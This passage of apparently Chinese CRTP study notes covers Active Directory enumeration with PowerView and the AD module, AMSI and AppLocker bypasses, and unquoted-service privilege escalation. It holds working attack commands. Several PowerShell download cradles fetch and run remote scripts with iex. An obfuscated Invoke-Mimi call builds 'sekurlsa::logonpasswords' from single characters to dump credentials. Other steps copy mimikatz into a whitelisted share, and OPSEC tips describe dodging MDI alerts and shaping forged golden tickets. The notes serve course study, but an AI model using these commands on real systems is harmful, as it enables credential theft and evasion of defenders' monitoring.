<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Find-DomianUserLocation</span> <span class="literal">-Verbose</span> <span class="literal">-UserGroupIdentity</span> <span class="string">&quot;RDPUsers&quot;</span></span><br></pre></td></tr></table></figure>

<p>这个函数的原理是先通过 <code>Get-DomianGroupMember</code> 获取用户，然后再 <code>Get-DomianComputer</code> 获取域机器列表，然后对每个机器执行 ( <code>GET-NetSession</code> &#x2F; <code>Get-NetLoggedon</code> ) 枚举机器上的用户session和登录情况。(默认是寻找 <code>domian admins</code> )</p>
<p>要注意的是，因为也会枚举DC机器上的，这会导致MDI告警。</p>
<p>bypass的方式为不要枚举DC（哈哈哈哈</p>
<h3 id="11-用户被配置为本地管理员-枚举"><a href="#11-用户被配置为本地管理员-枚举" class="headerlink" title="11.用户被配置为本地管理员 枚举"></a>11.用户被配置为本地管理员 枚举</h3><p>查询当前域中 当前用户被配置为本地管理员的机器</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Find-LocalAdminaccess</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<p>要注意,<code>Find-LocalAdminaccess</code> 函数动作如下</p>
<p>首先使用 <code>Get-NetComputer</code> 从 <code>DC</code> 中获取域主机列表</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-NetComputer</span></span><br></pre></td></tr></table></figure>
<p>然后在每一台机器上执行 <code>Invoke-checkLocalAdminAccess</code></p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Invoke-checkLocalAdminAccess</span></span><br></pre></td></tr></table></figure>

<p>(当拿到的账户在当前机器并不是管理员，但可能在其他机器上为本地管理员)<br>对其他主机使用的话或者请求被阻止的情况下，可以用下面两个脚本远程wmi协议或者smb</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Find-WMILocalAdminAccess</span>.ps1</span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Find-PSRemotingLocalAdminAccess</span>.ps1</span><br></pre></td></tr></table></figure>

<p>指定探测的域名范围</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Find-PSRemotingLocalAdminAccess</span>.ps1 <span class="literal">-Domian</span> dollarcorp.moneycorp.local <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<p>要注意的是这些都是首先从DC枚举机器，然后再挨个机器尝试的，这种行为会留下 4624（登录成功） 和 4634（登录失败）</p>
<p>而且我们不仅要寻找本地管理员权限，还要寻找是否有特定的组或者用户的会话session</p>
<h2 id="03-powershell"><a href="#03-powershell" class="headerlink" title="03 powershell"></a>03 powershell</h2><h3 id="bypass-amsi"><a href="#bypass-amsi" class="headerlink" title="bypass amsi"></a>bypass amsi</h3><p>1.reveres strings</p>
<p>example</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">New-Object System.Net.Sockets.TCPClient($IPAddress,$Port)...</span><br><span class="line"></span><br><span class="line">变成</span><br><span class="line"></span><br><span class="line">$Strings = &quot;stekcoS.teN&quot;</span><br><span class="line"></span><br><span class="line">$class = ([regex]::Matches($String,&#x27;.&#x27;,&#x27;RightToLeft&#x27;)|ForEach&#123;$_.values&#125;) -join &#x27;&#x27;</span><br><span class="line"></span><br><span class="line">像这样</span><br><span class="line"></span><br><span class="line">$strings=&#x27;paspsd&#x27;</span><br><span class="line"></span><br><span class="line"> $class = ([regex]::Matches($strings,&#x27;.&#x27;,&#x27;RightToLeft&#x27;)|ForEach&#123;$_.value&#125;) -join &#x27;&#x27;;$class</span><br><span class="line">dspsap</span><br></pre></td></tr></table></figure>

<p><strong>新版课程中开始推荐使用 Invisi-shell</strong></p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://github.com/OmerYa/Invisi-Shell">https://github.com/OmerYa/Invisi-Shell</a></p>
</blockquote>
<ul>
<li><p>避免被记录powershell日志</p>
</li>
<li><p>powershell从内存加载很好用 绕过<code>powershell security</code></p>
</li>
</ul>
<hr>
<p>2.mimikatz bypass</p>
<p>课程中给到了一个powerkatz.all base64后再反转的方式</p>
<p>通过判断启动时候先检测drivers下vm等文件是否存在的形式，来确实是否在沙箱，其实还可以通过判断c盘下文件路径或者机器名等来确定</p>
<p>3.powershell一些概念和用法</p>
<ul>
<li>PowerShell is NOT powershell.exe. lt is theSystem.Management.Automation.dl</li>
</ul>
<h3 id="加载模块"><a href="#加载模块" class="headerlink" title="加载模块"></a>加载模块</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">import-module</span> Path (example : C:\AD\Tools\test.psd1)</span><br></pre></td></tr></table></figure>

<h3 id="列出模块中可用的命令"><a href="#列出模块中可用的命令" class="headerlink" title="列出模块中可用的命令"></a>列出模块中可用的命令</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Command</span> <span class="literal">-Module</span> &lt;modulename&gt; </span><br></pre></td></tr></table></figure>

<h3 id="powershell-下载"><a href="#powershell-下载" class="headerlink" title="powershell 下载"></a>powershell 下载</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">iex (New-object Net.webclient).downloadstring(&quot;http://test.com/test.ps1&quot;)</span><br></pre></td></tr></table></figure>

<p>↓这个在新版本windows已经被弃用了，会弹出来IE浏览器，如果直接拿来打印页面内容话根本获取不到内容..</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ie</span> = <span class="built_in">New-Object</span> <span class="literal">-ComObject</span> InternetExplorer.Application;<span class="variable">$ie</span>.visible=<span class="variable">$False</span>;<span class="variable">$ie</span>.navigate(<span class="string">&quot;http://192.168.221.128&quot;</span>);</span><br><span class="line"><span class="variable">$response</span>=<span class="variable">$ie</span>.Document.body.innerHTML;</span><br><span class="line"><span class="built_in">write-host</span> <span class="variable">$response</span></span><br><span class="line"><span class="variable">$ie</span>.quit();</span><br><span class="line"><span class="built_in">iex</span> <span class="variable">$response</span>;</span><br></pre></td></tr></table></figure>

<p>比较新的↓</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">IEX</span> (<span class="built_in">Invoke-WebRequest</span> <span class="literal">-Uri</span> <span class="string">&quot;http://192.168.221.128/test.ps1&quot;</span>)</span><br></pre></td></tr></table></figure>

<p>另一种，不知道为啥本地只能获取内容 <code>PSv3</code> 会提示没有</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PSv3 onwards <span class="literal">-iex</span> (<span class="built_in">iwr</span> <span class="string">&#x27;http://192.168.221.128/test.ps1&#x27;</span>)</span><br></pre></td></tr></table></figure>

<p>通过xml</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$h</span> = <span class="built_in">New-Object</span> <span class="literal">-ComObject</span> Msxml2.XMLHTTP;</span><br><span class="line"><span class="variable">$h</span>.open(<span class="string">&quot;GET&quot;</span>,<span class="string">&quot;http://192.168.221.128/test.ps1&quot;</span>,<span class="variable">$False</span>);</span><br><span class="line"><span class="variable">$h</span>.send();</span><br><span class="line"><span class="built_in">iex</span> <span class="variable">$h</span>.responseText;</span><br></pre></td></tr></table></figure>

<p>.net 形式的</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#调用HttpWebRequest的Create方法</span></span><br><span class="line"><span class="variable">$wr</span> = [<span class="type">System.NET.WebRequest</span>]::Create(<span class="string">&quot;http://192.168.221.128/test.ps1&quot;</span>)</span><br><span class="line"><span class="variable">$r</span> = <span class="variable">$wr</span>.GetResponse();</span><br><span class="line"><span class="comment">#转responsse 换为 StreamReader 然后readToEnd</span></span><br><span class="line"><span class="built_in">IEX</span> ([<span class="type">System.IO.StreamReader</span>](<span class="variable">$r</span>.GetResponseStream())).ReadToEnd()</span><br><span class="line"></span><br><span class="line"><span class="comment"># 一行</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">IEX</span> ([<span class="type">System.IO.StreamReader</span>](([<span class="type">System.NET.WebRequest</span>]::Create(<span class="string">&quot;http://192.168.221.128/test.ps1&quot;</span>)).GetResponse()).GetResponseStream()).ReadToEnd()</span><br></pre></td></tr></table></figure>

<p>5.1 版本的 powershell记录 开始记录日志</p>
<ul>
<li><p>4104</p>
</li>
<li><p>4103</p>
</li>
</ul>
<h3 id="powershell-语言模式"><a href="#powershell-语言模式" class="headerlink" title="powershell 语言模式"></a>powershell 语言模式</h3><blockquote>
<p><a target="_blank" rel="noopener" href="https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_language_modes?view=powershell-7.5&viewFallbackFrom=powershell-7.3">https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_language_modes?view=powershell-7.5&amp;viewFallbackFrom=powershell-7.3</a></p>
</blockquote>
<p>powershell中有四种语言模式</p>
<ul>
<li>FullLanguage</li>
<li>RestrictedLanguage</li>
<li>ConstrainedLanguage （于Powershell3.0版本引入）</li>
<li>NoLanguage</li>
</ul>
<p>查看当前语言模式</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$ExecutionContext</span>.SessionState.LanguageMode</span><br></pre></td></tr></table></figure>

<p>按照权限开放度排序</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">FullLanguage &gt; RestrictedLanguage &gt; ConstrainedLanguage &gt; NoLanguage</span><br></pre></td></tr></table></figure>

<p>在crtp，其使用规避 <code>ConstrainedLanguage</code> 或受限语言模式是使用 <code>invishell</code> 中的bat来加载dll。</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RunWithRegistryNonAdmin.bat</span><br></pre></td></tr></table></figure>

<p>或有admin权限的话执行下面这个</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">RunWithPathAsAdmin.bat</span><br></pre></td></tr></table></figure>

<p>要注意的是 如果如果主机上有 <code>applocker</code> 或 <code>Device Guard</code> 这样的程序应用白名单解决方案或者执行规则（Execution Rule），<code>powershell</code> 将会被降级到<code>ConstrainedLanguage</code> 模式 。</p>
<h4 id="applocker"><a href="#applocker" class="headerlink" title="applocker"></a>applocker</h4><p><strong>注：applocker采用的是白名单模式。</strong></p>
<p>查看 <code>applocker</code> 规则</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ApplockerPolicy</span> <span class="literal">-Effective</span> </span><br></pre></td></tr></table></figure>

<p>进一步筛选查看白名单路径等</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-AppLockerPolicy</span> <span class="literal">-Effective</span> | <span class="built_in">select</span> <span class="literal">-ExpandProperty</span> RuleCollections</span><br></pre></td></tr></table></figure>

<p>但当前用户在这台运行了 <code>applocker</code> 机器上有管理员权限时，有多种方式关闭掉applocker</p>
<p>不过这个实验室里做了多种限制使得applocker并不容易被关掉，首先采用配置白名单目录的配置缺陷来做。</p>
<p>这里通过筛选 <code>applocker</code> 策略发现，下面的目录被允许执行脚本等</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;%PROGRAMFILES%\*&#125;</span><br></pre></td></tr></table></figure>

<p>将混淆过的mimikatz脚本，这个 <code>Invoke-mimi.ps1</code> 传输到这个机器对应的白名单目录下，即可使用</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">copy-item</span> C:\AD\Tools\<span class="built_in">Invoke-mimi</span>.ps1 \\dcorp<span class="literal">-adminsrv</span>.dollarcorp.moneycorp.local\C<span class="variable">$</span>\<span class="string">&#x27;Program Files&#x27;</span></span><br></pre></td></tr></table></figure>

<p>然后是通过用户所属的组对 <code>Applocker</code> 的组策略权限有编辑权限，来删除<code>Applocker</code>执行规则。</p>
<p>组策略控制台</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gpmc.msc</span><br></pre></td></tr></table></figure>

<p>选中编辑applocker策略</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Applocked-&gt;applocker（Edit）</span><br></pre></td></tr></table></figure>

<p>找到applocker具体编辑项目，删除执行规则（Execution Rule）</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Windows Settings -&gt; Security Settings -&gt; Application control Policies -&gt; Applocker -&gt; Execution Rules -&gt; (Deleted Target Rule)</span><br></pre></td></tr></table></figure>

<h3 id="powershell执行脚本受限"><a href="#powershell执行脚本受限" class="headerlink" title="powershell执行脚本受限"></a>powershell执行脚本受限</h3><p>当前为 <code>ConstrainedLanguage</code> 模式的话将没有权限带着参数调用ps1脚本等。</p>
<p>所以这里比如执行 <code>Invoke-mimi.ps1</code>,原本是需要带上参数的</p>
<p>但是这里可以修改脚本，在脚本执行最后添加执行 <code>mimikatz</code> 命令</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="variable">$1</span>=<span class="string">&quot;s&quot;</span>;</span><br><span class="line"><span class="variable">$2</span>=<span class="string">&quot;e&quot;</span></span><br><span class="line"><span class="variable">$3</span>=<span class="string">&quot;k&quot;</span></span><br><span class="line"><span class="variable">$4</span>=<span class="string">&quot;u&quot;</span></span><br><span class="line"><span class="variable">$5</span>=<span class="string">&quot;r&quot;</span></span><br><span class="line"><span class="variable">$6</span>=<span class="string">&quot;l&quot;</span></span><br><span class="line"><span class="variable">$7</span>=<span class="string">&quot;a&quot;</span></span><br><span class="line"><span class="variable">$8</span>=<span class="string">&quot;:&quot;</span></span><br><span class="line"><span class="variable">$9</span>=<span class="string">&quot;y&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$1</span>+<span class="variable">$2</span>+<span class="variable">$3</span>+<span class="variable">$4</span>+<span class="variable">$5</span>+<span class="variable">$6</span>+<span class="variable">$1</span>+<span class="variable">$7</span>+<span class="variable">$8</span>+<span class="variable">$8</span>+<span class="variable">$2</span>+<span class="variable">$3</span>+<span class="variable">$2</span>+<span class="variable">$9</span>+<span class="variable">$1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">Invoke-Mimi</span> <span class="literal">-Command</span> <span class="variable">$a</span></span><br></pre></td></tr></table></figure>




<h2 id="OPSEC"><a href="#OPSEC" class="headerlink" title="OPSEC"></a>OPSEC</h2><h3 id="域票据"><a href="#域票据" class="headerlink" title="域票据"></a>域票据</h3><p>mimiktaz的金票是10年，查看域规则的票据过期时间，伪造的票据过期时间应当尽量与域策略统一。</p>
<h3 id="域用户"><a href="#域用户" class="headerlink" title="域用户"></a>域用户</h3><p>通过logon次数来规避使用极少使用的用户</p>
<h2 id="04-GPO-OU"><a href="#04-GPO-OU" class="headerlink" title="04 GPO,OU"></a>04 GPO,OU</h2><h3 id="GPO"><a href="#GPO" class="headerlink" title="GPO"></a>GPO</h3><p>将一个组策略应用给权限比较宽松的OU，是比较常见的滥用场景</p>
<p>获取域内所有组策略（GPO）<br>powerview</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-DomianGPO</span></span><br></pre></td></tr></table></figure>

<p>进查看displayname</p>
<p>powerview</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-DomianGPO</span> | <span class="built_in">select</span> displayname</span><br></pre></td></tr></table></figure>

<h3 id="OU"><a href="#OU" class="headerlink" title="OU"></a>OU</h3><p>列出OU</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainOU</span><br></pre></td></tr></table></figure>

<p>根据上一条命令，可以通过GPlink的CN来获取指定的GPO</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomianGPO -Identity &#x27;&#123;xxxxxxx-xxxx-xxxx-xxxx-xxxxxx&#125;&#x27;</span><br></pre></td></tr></table></figure>

<p>查询在指定OU中的 计算机 有哪些</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">Get-DomianOU</span> <span class="literal">-Identity</span> Devops).distinguishedname| %&#123;<span class="built_in">Get-DomianComputer</span> <span class="literal">-Search</span> <span class="variable">$_</span>&#125; |<span class="built_in">select</span> name</span><br></pre></td></tr></table></figure>

<h3 id="受限组"><a href="#受限组" class="headerlink" title="受限组"></a>受限组</h3><p><strong>“受限组”是什么？</strong></p>
<ul>
<li>是一种 组策略设置，用于强制某个本地组（比如本地 Administrators）中只能包含特定的成员。</li>
</ul>
<p>换句话说，你用“受限组”配置了一个本地组，那么无论别人手动加了什么用户进去，都会被策略重写成你设定的那一套。</p>
<p><strong>“将域组添加到本地组”</strong></p>
<ul>
<li>比如你想让一个 AD 域里的组（如 DOMAIN\Admins）或者某个用户自动变成本地机器上的管理员，那你可以通过“受限组”来实现这个操作。</li>
</ul>
<p>攻击者可以</p>
<p>1.用“受限组”把自己加入所有机器的 Administrators！</p>
<p>2.然后每台机器都自动把他加入进去（持续生效）！</p>
<p>枚举</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Get-DomainGPOLocalGroup</span><br></pre></td></tr></table></figure>

<p><a target="_blank" rel="noopener" href="https://www.cnblogs.com/linuxsec/articles/8270543.html">https://www.cnblogs.com/linuxsec/articles/8270543.html</a></p>
<p>获取用户被GPO配置为哪几个机器的本地特殊组成员</p>
<p>powerview</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-DomainGPOUserLocalGroupMapping</span> <span class="literal">-Identity</span> Student1 <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<p>列出针对某台机器，GPO中配置了本地组的账户成员</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-DomianGPOComputerLocalGroupMapping</span> <span class="literal">-ComputerIdentity</span> dcorp<span class="literal">-student1</span></span><br></pre></td></tr></table></figure>

<h3 id="GPO滥用"><a href="#GPO滥用" class="headerlink" title="GPO滥用"></a>GPO滥用</h3><p>截取NTLM凭据，重放至DC，通过修改GPO的 <code>gPCFileSysPath</code> （定义组策略对象加载策略的路径），指向我们自定义的恶意组策略路径模板。</p>
<blockquote>
<p><a target="_blank" rel="noopener" href="https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more">https://www.synacktiv.com/publications/gpoddity-exploiting-active-directory-gpos-through-ntlm-relaying-and-more</a></p>
</blockquote>
<h2 id="05-Domian-Trusts"><a href="#05-Domian-Trusts" class="headerlink" title="05 Domian Trusts"></a>05 Domian Trusts</h2><h3 id="外部信任"><a href="#外部信任" class="headerlink" title="外部信任"></a>外部信任</h3><p>多个外部信任之间，即便有信任的情况下，也需要被访问方配置明确指定访问的资源才可以访问.</p>
<p>所以企业建设采用多个林与林是相对安全的选择</p>
<h3 id="Forest-Trusts"><a href="#Forest-Trusts" class="headerlink" title="Forest Trusts"></a>Forest Trusts</h3><p><code>Forest Trusts</code> 指多个林根之间互相信任，林交叉</p>
<h3 id="枚举域名信任"><a href="#枚举域名信任" class="headerlink" title="枚举域名信任"></a>枚举域名信任</h3><p>获取所有域信任</p>
<p>powerview</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-DomianTrust</span></span><br></pre></td></tr></table></figure>

<p>获得指定域的所有域信任</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-DomianTrust</span> <span class="literal">-Domain</span> us.dollarcorp.moneycorp.local</span><br></pre></td></tr></table></figure>

<p>AD module</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADTrust</span> <span class="literal">-Identity</span> us.dollarcorp.moneycorp.local</span><br></pre></td></tr></table></figure>

<h3 id="枚举-Forest"><a href="#枚举-Forest" class="headerlink" title="枚举 Forest"></a>枚举 Forest</h3><p>当前域林的所有信息</p>
<p>powerview</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Forest</span></span><br></pre></td></tr></table></figure>

<p>获取指定域林的信息</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Forest</span> <span class="literal">-Forest</span> eurocorp.local </span><br></pre></td></tr></table></figure>

<p>AD module</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADForest</span></span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-Forest</span> <span class="literal">-Identity</span> eurocorp.local</span><br></pre></td></tr></table></figure>

<h3 id="获取指定域林中的域"><a href="#获取指定域林中的域" class="headerlink" title="获取指定域林中的域"></a>获取指定域林中的域</h3><p>获取一个指定域林中的所有域</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ForestDomian</span></span><br></pre></td></tr></table></figure>

<p>获得指定域林中的域</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ForestDomian</span> <span class="literal">-Forest</span> eurocorp.local</span><br></pre></td></tr></table></figure>

<p>当与其他域林有双向信任的情况下，也可以在这里指定其他域林然后查看他域中的信任关系</p>
<p>(注意，如果仅和其他域林中的根域有双向信任，而与其子域名没有信任的话，则无法对其子域<code>Get-DomianTrust</code>)</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ForestDomian</span> <span class="literal">-Forest</span> eurocorp.local | %&#123;<span class="built_in">Get-ForestTrust</span> <span class="literal">-Domian</span> <span class="variable">$_</span>.name&#125;</span><br></pre></td></tr></table></figure>



<p>ad module</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(<span class="built_in">Get-ADForest</span>).Domians</span><br></pre></td></tr></table></figure>

<h3 id="列出林中的全局编录服务器（枚举作为全局目录的DC控制器）"><a href="#列出林中的全局编录服务器（枚举作为全局目录的DC控制器）" class="headerlink" title="列出林中的全局编录服务器（枚举作为全局目录的DC控制器）"></a>列出林中的全局编录服务器（枚举作为全局目录的DC控制器）</h3><p>当前林</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ForestGloblCatalog</span></span><br></pre></td></tr></table></figure>

<p>指定林</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ForestGlobalCatalog</span> <span class="literal">-Forest</span> eurocorp.local</span><br></pre></td></tr></table></figure>

<p>AD module</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADForest</span> |<span class="built_in">select</span> <span class="literal">-ExpandProperty</span> GlobalCatalogs</span><br></pre></td></tr></table></figure>

<h3 id="枚举域林之间信任"><a href="#枚举域林之间信任" class="headerlink" title="枚举域林之间信任"></a>枚举域林之间信任</h3><p>枚举域林之间信任关系</p>
<p>powerview</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ForestTrust</span></span><br></pre></td></tr></table></figure>

<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ForestTrust</span> <span class="literal">-Forest</span> eurocorp.local</span><br></pre></td></tr></table></figure>

<p>AD module</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ADTrust</span> <span class="literal">-Filter</span> <span class="string">&quot;msDS-TrustForestTrustInfo&quot;</span> <span class="operator">-ne</span> <span class="string">&quot;<span class="variable">$null</span>&quot;</span></span><br></pre></td></tr></table></figure>

<h2 id="06-权限提升-Privilege-Escalation"><a href="#06-权限提升-Privilege-Escalation" class="headerlink" title="06 权限提升(Privilege Escalation)"></a>06 权限提升(Privilege Escalation)</h2><ul>
<li>缺少补丁</li>
<li>自动部署和明文中的自动登录密码</li>
<li>任何用户都可以以SYSTEM身份运行MSI(AlwavsInstalElevated)</li>
<li>配置错误的服务</li>
<li>DLL劫持等</li>
<li>Kerberos和 NTLM 转发</li>
</ul>
<p>枚举工具：</p>
<p>（有点老的工具）</p>
<p><a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc</a></p>
<p>（比较新还在维护的）<br><a target="_blank" rel="noopener" href="https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc">https://github.com/PowerShellMafia/PowerSploit/tree/master/Privesc</a></p>
<p>winpeas</p>
<h3 id="1-缺陷服务枚举"><a href="#1-缺陷服务枚举" class="headerlink" title="1.缺陷服务枚举"></a>1.缺陷服务枚举</h3><p>带有空格但是没有引号包裹的服务</p>
<p>以这个为例</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\WebServer\Abyss Web Serkerabyssws.exe -service</span><br></pre></td></tr></table></figure>
<p>没有引号包裹导致，可以通过上传 <code>C:\WebServer\Abyss.exe</code> 恶意载荷，重启服务即可得到权限。</p>
<p>PowerUP</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ServiceUnquoted</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<p>获取当前用户有修改二进制执行路径或参数的服务</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ModifiableServiceFile</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<p>获取当前用户能够有权限修改服务配置的服务</p>
<figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">Get-ModifiableService</span> <span class="literal">-Verbose</span></span><br></pre></td></tr></table></figure>

<p>通常是服务权限 <code>DSCL</code> 过松</p>
<p>(服务权限结尾的 <code>WD</code> 代表的是所有人)</p>
